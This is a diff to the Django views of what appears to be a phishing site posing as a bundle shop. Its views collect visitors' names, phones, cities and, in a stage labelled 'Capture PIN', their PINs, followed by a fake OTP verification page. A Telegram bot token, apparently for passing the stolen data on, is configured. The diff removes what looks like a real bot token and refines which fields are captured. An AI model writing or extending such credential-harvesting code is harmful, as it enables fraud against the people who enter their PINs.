@@ -4,16 +4,22 @@ import requests
 from django.shortcuts import render, redirect
 from django.http import JsonResponse
 from django.views.decorators.csrf import csrf_exempt
-from django.conf import settings
 
 
 # Telegram Configuration
-BOT_TOKEN = "8746127400:AAF26ofxMqh2XXFAwo72ZuB5iBnSkHu1aBY"
-CHAT_ID = "6786520065"
+BOT_TOKEN = "YOUR_BOT_TOKEN"
+CHAT_ID = "YOUR_CHAT_ID"
 
 
 def home(request):
     return render(request, 'index.html')
+
+
+def checkout(request):
+    """
+    Checkout page
+    """
+    return render(request, 'checkout.html')
 
 
 def payment_instructions(request):
@@ -22,9 +28,10 @@ def payment_instructions(request):
     """
     if request.method == 'POST':
 
-        request.session['name'] = request.POST.get('name', '')
-        request.session['city'] = request.POST.get('city', '')
+        request.session['name'] = request.POST.get('fullName', '')
+        request.session['phone'] = request.POST.get('phone', '')
         request.session['bundle'] = request.POST.get('bundle', '')
+        request.session['city'] = request.POST.get('city', '')
 
         return render(request, 'payment_instructions.html')
 
@@ -33,11 +40,10 @@ def payment_instructions(request):
 
 def otp_verification(request):
     """
-    Stage 3: Capture phone and PIN
+    Stage 3: Capture PIN
     """
     if request.method == 'POST':
 
-        request.session['phone'] = request.POST.get('phone', '')
         request.session['pin'] = request.POST.get('pin', '')
 
         return render(request, 'otp_verification.html')
